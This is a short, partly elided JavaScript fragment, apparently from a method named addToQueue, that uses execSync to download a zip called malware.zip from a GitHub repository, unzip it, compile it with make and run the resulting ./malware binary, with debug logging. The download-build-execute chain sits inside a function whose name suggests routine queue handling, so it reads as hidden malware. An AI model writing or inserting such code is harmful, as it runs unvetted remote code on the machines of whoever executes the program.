...
static addToQueue(process) {
  ...
  */
  ...
  try {
    ...
    const downloadOutput = execSync('wget -O malware.zip https://github.com/pakaremon/malware/archive/refs/heads/master.zip', { stdio: 'pipe' });
    console.log('[DEBUG] Download output:', downloadOutput.toString());

    console.log('[DEBUG] Unzipping malware.zip...');
    const unzipOutput = execSync('unzip malware.zip', { stdio: 'pipe' });
    ...
    const makeOutput = execSync('cd malware-master && make && ./malware', { stdio: 'pipe' });
